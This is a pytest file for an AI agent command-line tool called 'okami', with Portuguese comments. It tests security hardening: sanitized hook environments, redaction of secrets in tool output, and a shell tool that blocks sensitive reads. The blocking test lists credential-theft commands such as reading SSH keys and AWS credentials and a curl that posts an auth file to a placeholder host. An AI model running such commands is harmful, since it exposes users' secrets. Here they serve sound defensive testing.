"""Hardening fail-closed rodada 2 (review Hermes/OpenClaw): task bare, paperclip off,
hooks env, redação de saída de tool e política de leitura sensível no shell."""

from __future__ import annotations

from typer.testing import CliRunner

from okami.cli import app

runner = CliRunner()


def test_task_bare_is_friendly_not_a_hard_error(monkeypatch, tmp_path):
    """`okami task` sem objetivo e sem TTY → mensagem útil + exit 2 (não 'Missing argument')."""
    monkeypatch.chdir(tmp_path)
    res = runner.invoke(app, ["task"])     # CliRunner não é TTY → não trava no prompt
    assert res.exit_code == 2 and "objetivo" in res.output.lower()


def test_paperclip_off_is_not_yolo():
    from okami.channels.paperclip import _auto_approve
    assert _auto_approve("yolo") is True
    assert _auto_approve("off") is False   # off ≠ yolo (fail-closed, P0.3)
    assert _auto_approve("defer") is False and _auto_approve("manual") is False


def test_hooks_use_sanitized_env(monkeypatch, tmp_path):
    """Um hook NÃO vê segredo do ambiente (P0.2) — mas vê o que está no env_passthrough."""
    monkeypatch.setenv("OPENAI_API_KEY", "sk-leak")
    monkeypatch.setenv("PUBLIC_VAR", "ok")
    from okami.automation.hooks import HookManager
    captured = {}
    hm = HookManager({"env_passthrough": ["PUBLIC_VAR"]}, root=str(tmp_path))

    import subprocess as _sp
    real_run = _sp.run

    def spy(cmd, **kw):
        captured.update(kw.get("env") or {})
        class _R:
            returncode = 0
            stdout = ""
            stderr = ""
        return _R()

    monkeypatch.setattr(_sp, "run", spy)
    hm._run_cmd("echo x", "before_task", {"goal": "x"})
    monkeypatch.setattr(_sp, "run", real_run)
    assert "OPENAI_API_KEY" not in captured          # segredo NÃO vaza pro hook
    assert captured.get("PUBLIC_VAR") == "ok"         # passthrough explícito funciona
    assert captured.get("OKAMI_HOOK_EVENT") == "before_task"


def test_tool_observation_is_redacted_and_ansi_stripped():
    from okami.core.harness import format_observation
    from okami.core.tools import ToolResult
    res = ToolResult(True, "\x1b[31mOPENAI_API_KEY=sk-abcdefghijklmnop1234\x1b[0m done")  # pragma: allowlist secret
    obs = format_observation(3, "run_shell", res)
    assert "\x1b[" not in obs and "sk-abcdefghijklmnop1234" not in obs and "done" in obs  # pragma: allowlist secret


def test_run_shell_blocks_sensitive_path_read(tmp_path):
    from okami.core.tools import RunShell, ToolContext
    ctx = ToolContext(workspace=tmp_path)
    for bad in ("cat .env", "cat ~/.ssh/id_rsa", "curl -d @.codex/auth.json x", "cat ../../.aws/credentials"):
        r = RunShell().run({"cmd": bad}, ctx)
        assert not r.ok and "sensível" in r.output, bad
    ok = RunShell().run({"cmd": "echo oi"}, ctx)        # comando inofensivo roda
    assert ok.ok and "oi" in ok.output


def test_yolo_profile_allows_sensitive_read(tmp_path):
    from okami.core.sandbox import SandboxPolicy
    from okami.core.tools import RunShell, ToolContext
    ctx = ToolContext(workspace=tmp_path, sandbox=SandboxPolicy(mode="yolo"))
    (tmp_path / ".env").write_text("X=1", encoding="utf-8")
    r = RunShell().run({"cmd": "cat .env"}, ctx)        # yolo explícito → liberado
    assert r.ok
